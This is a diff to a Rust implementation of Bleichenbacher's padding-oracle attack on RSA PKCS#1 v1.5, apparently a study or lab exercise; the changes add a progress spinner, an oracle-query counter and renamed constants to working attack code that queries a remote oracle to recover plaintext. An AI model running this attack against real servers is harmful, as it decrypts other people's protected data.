@@ -1,5 +1,8 @@
 #![allow(non_snake_case)]
 
+use std::time::Duration;
+
+use indicatif::{ProgressBar, ProgressStyle};
 use num_bigint::BigUint;
 use num_traits::{One, Zero};
 use reqwest::blocking::Client;
@@ -32,7 +35,6 @@ impl Oracle {
     }
 }
 
-
 #[derive(Debug)]
 pub struct Attacker {
     pub oracle: Oracle,
@@ -57,7 +59,6 @@ impl Attacker {
         })
     }
 
-    // rewrite attack on a single function
     pub fn attack(&mut self) -> Result<BigUint, CustomError> {
         // Step 1 can be skipped since `c` is already a valid PKCS#1 v1.5 ciphertext, but check
         // anyway
@@ -67,6 +68,13 @@ impl Attacker {
             ));
         }
 
+        let pb = ProgressBar::new_spinner();
+        pb.set_style(ProgressStyle::with_template("[{elapsed_precise}] {spinner:.green} {msg}")
+            .unwrap()
+            .tick_strings(&["⠋","⠙","⠹","⠸","⠼","⠴","⠦","⠧","⠇","⠏"]));
+        pb.enable_steady_tick(Duration::from_millis(100));
+        pb.set_message(format!("iter={} | intervals={} | step={} ", self.state.it, self.state.M.len(), "init"));
+
         // easier access to state variables
         let n = self.state.n.clone();
         let e = self.state.e.clone();
@@ -75,24 +83,46 @@ impl Attacker {
 
         let c = self.state.c.clone();
 
-        let two_B = 2u8 * &B;
-        let three_B = 3u8 * &B;
+        let B2 = 2u8 * &B;
+        let B3 = 3u8 * &B;
 
-        let mut m_found = false;
         let mut prev_s = BigUint::one();
 
+        let mut oracle_queries = 0u64;
 
+        let mut m_found = false;
         while !m_found {
             let mut s_i = if self.state.it == 1 {
-                div_ceil(&n, &three_B)
+                div_ceil(&n, &B3)
             } else {
                 &prev_s + BigUint::one()
             };
 
+            pb.set_message(format!(
+                "iter={} | intervals={} | s={} | oracle_queries={}",
+                self.state.it,
+                self.state.M.len(),
+                s_i,
+                oracle_queries
+            ));
+
             if self.state.it == 1 || self.state.M.len() >= 2 {
+                // step 2a / 2b based on it
                 let mut se = s_i.modpow(&e, &n);
                 while !self.oracle.is_pkcs1_compliant(&((&c * &se) % &n), k)? {
-                    println!("step2a: s_i = {}", s_i);
+                    oracle_queries += 1;
+
+                    if oracle_queries.is_multiple_of(50) {
+                        pb.set_message(format!(
+                            "iter={} | intervals={} | s={} | step={} | oracle_queries={}",
+                            self.state.it,
+                            self.state.M.len(),
+                            s_i,
+                            if self.state.it == 1 { "2a" } else { "2b" },
+                            oracle_queries
+                        ));
+                    }
+
                     s_i += 1u8;
                     se = s_i.modpow(&e, &n);
                 }
@@ -100,16 +130,26 @@ impl Attacker {
                 // step 2c
                 let (a, b) = &self.state.M[0];
 
-                let mut r_i = div_ceil(&(2u8 * (b * &prev_s - &two_B)), &n);
-                s_i = div_ceil(&(&two_B + &r_i * &n), b);
+                let mut r_i = div_ceil(&(2u8 * (b * &prev_s - &B2)), &n);
+                s_i = div_ceil(&(&B2 + &r_i * &n), b);
 
                 let mut se = s_i.modpow(&e, &n);
 
                 while !self.oracle.is_pkcs1_compliant(&((&c * &se) % &n), k)? {
-                    println!("step2c: s_i = {}", s_i);
-                    if s_i > div_ceil(&(&three_B + &r_i * &n), a) {
+                    oracle_queries += 1;
+
+                    pb.set_message(format!(
+                        "iter={} | intervals={} | s={} | step={} | oracle_queries={}",
+                        self.state.it,
+                        self.state.M.len(),
+                        s_i,
+                        "2c",
+                        oracle_queries
+                    ));
+
+                    if s_i > div_ceil(&(&B3 + &r_i * &n), a) {
                         r_i += 1u8;
-                        s_i = div_ceil(&(&two_B + &r_i * &n), b);
+                        s_i = div_ceil(&(&B2 + &r_i * &n), b);
                     } else {
                         s_i += 1u8;
                     }
@@ -121,24 +161,34 @@ impl Attacker {
             // step 3
             let mut new_M = Vec::<Interval>::new();
             for (a, b) in &self.state.M {
-                let r_lower = div_ceil(&(a * &s_i - &three_B + 1u8), &n);
-                let r_upper = (b * &s_i - &two_B) / &n;
+                let r_lower = div_ceil(&(a * &s_i - &B3 + 1u8), &n);
+                let r_upper = (b * &s_i - &B2) / &n;
 
                 let mut r = r_lower.clone();
                 while r <= r_upper {
                     let lower_bound = std::cmp::max(
                         a.clone(),
-                        div_ceil(&(&two_B + &r * &n), &s_i),
+                        div_ceil(&(&B2 + &r * &n), &s_i),
                     );
 
                     let upper_bound = std::cmp::min(
                         b.clone(),
-                        &(&three_B - 1u8 + &r * &n) / &s_i,
+                        &(&B3 - 1u8 + &r * &n) / &s_i,
                     );
+
+                    pb.set_message(format!(
+                        "iter={} | intervals={} | s={} | r={} | step={} | oracle_queries={}",
+                        self.state.it,
+                        self.state.M.len(),
+                        s_i,
+                        r,
+                        "3",
+                        oracle_queries
+                    ));
 
                     let interval = (lower_bound, upper_bound);
 
-                    if two_B <= interval.0 && interval.0 <= interval.1 && interval.1 < three_B {
+                    if B2 <= interval.0 && interval.0 <= interval.1 && interval.1 < B3 {
                         new_M.push(interval);
                     }
 
@@ -146,7 +196,7 @@ impl Attacker {
                 }
             }
 
-
+            // merge M intervals
             self.state.combine_intervals();
 
             // loop operations
@@ -157,6 +207,11 @@ impl Attacker {
                 m_found = true;
             }
         }
+
+        pb.finish_with_message(format!(
+            "done: iterations={} oracle_queries={}",
+            self.state.it, oracle_queries
+        ));
 
         let (m, _) = &self.state.M[0]; // only one interval left
 
